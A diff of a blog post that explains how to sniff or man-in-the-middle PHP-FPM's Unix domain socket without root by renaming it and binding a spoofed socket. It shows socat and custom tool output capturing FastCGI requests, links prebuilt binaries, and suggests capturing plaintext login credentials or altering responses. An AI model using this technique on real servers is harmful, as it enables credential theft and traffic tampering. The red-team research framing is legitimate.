@@ -54,7 +54,7 @@ listen = /tmp/.php-fpm.sock
 ```
 
 So I began to search for ways of sniffing the Unix domain socket, and turns out it's pretty hard to properly sniff it, mainly because it isn't bound to any protocol, and most reliable ways use `ptrace`, but a dirty hack it's to just rename the socket, everything's a file on unix yadayada, and create a new one that MiTM it , like this [superuser.com/a/576404](https://superuser.com/a/576404), using `socat`. Note that this only works if you can write on the socket's directory, I'm still not sure if this is the default when using a supervisor, or it's a misconfig putting the socket on `/tmp`, but surely it isn't that uncommon.
-So here's the PoC :
+So here's the first attempt using `socat` :
 
 ```
 /tmp $ id
@@ -135,7 +135,7 @@ CONNECT:/tmp/.php-fpm.sock.1
 --
 ```
 
-Yay! The PoC worked locally and I was seeing the FastCGI requests, but this PoC has some problems:
+Yay! The `socat` worked locally and I was seeing the FastCGI requests, but `socat` has some problems:
 
 1. Renaming the socket brought the server down.
 2. If my spoofed socket crashed for some reason the server would also go down. 
@@ -145,7 +145,49 @@ So I made a script that automatizes this whole process, and makes sure that if a
 
 <script src="https://gist-it.appspot.com/github/caioluders/rootless_sniffing/blob/main/dsm.c"></script>
 
-Here are static-linked binaries for red teaming purposes on [github.com/caioluders/rootless_sniffing](https://github.com/caioluders/rootless_sniffing)
+The PoC running :
+
+```
+/tmp $ ./dsm .php-fpm.sock
+Unix Domain Socket Sniffer
+by @caioluders
+[?] Renamed .php-fpm.sock to .php-fpm.sock.1
+[?] Bind spoofed socket .php-fpm.sock
+[?] Spoofed socket is listening...
+[?] New connection
+
+------------------------------------ .php-fpm.sock ------------------------------------
+SCRIPT_FILENAME/api/public/index.php
+                                    QUERY_STRINGq=/&REQUEST_METHODGET
+                                                                     CONTENT_TYPECONTENT_LENGTH
+
+SCRIPT_NAME/index.php
+                     REQUEST_URI/
+
+DOCUMENT_URI/index.php
+DOCUMENT_ROOT/api/publiSERVER_PROTOCOLHTTP/1.1REQUEST_SCHEMEhttpGATEWAY_INTERFACECGI/1.1
+ SERVER_SOFTWAREnginx/1.18.0
+
+REMOTE_ADDR172.18.0.1
+                     REMOTE_PORT57778
+
+SERVER_ADDR172.18.0.2
+                     SERVER_PORT80
+                                  SERVER_NAME_REDIRECT_STATUS200	HTTP_HOST127.0.0.1:9022RHTTP_USER_AGENTMozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:85.0) Gecko/20100101 Firefox/85.0
+                   JHTTP_ACCEPTtext/html,application/xhtml+xml,application/xml;q=0.9,imHTTP_ACCEPT_ENCODINGgzip, deflateNGUAGEpt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
+HTTP_CONNECTIONkeep-aliveHTTP_UPGRADE_INSECURE_REQUESTS1
+------------------------------------- New Packet -------------------------------------
+
+----------------------------------- .php-fpm.sock.1 -----------------------------------
+Primary script unknownkStatus: 404 Not Found
+X-Powered-By: PHP/7.4.15
+Content-type: text/html; charset=UTF-8
+
+File not found.
+[?] New connection
+```
+
+Here are static-linked binaries for red teaming purposes on [github.com/caioluders/rootless_sniffing/blob/main/dsm?raw=true](https://github.com/caioluders/rootless_sniffing/blob/main/dsm?raw=true)
 
 # Conclusions
 It was really insightful to go this low on the unix kernel, I'm more of a web guy I guess, and helped a lot to better understand basic authorization flows on the linux kernel. Altho most of my ideas were shit and didn't work, having found that I can spoof the Unix domain socket that the Nginx uses internally is a new technique for me. This can be used on red teaming to escalate privileges, if you weren't able to root it, by getting plain text credentials on a login POST request for example. You can also do more than just sniffing the requests: you can alter the server's responses! Use your imagination, maybe I make a tool later to achieve that.
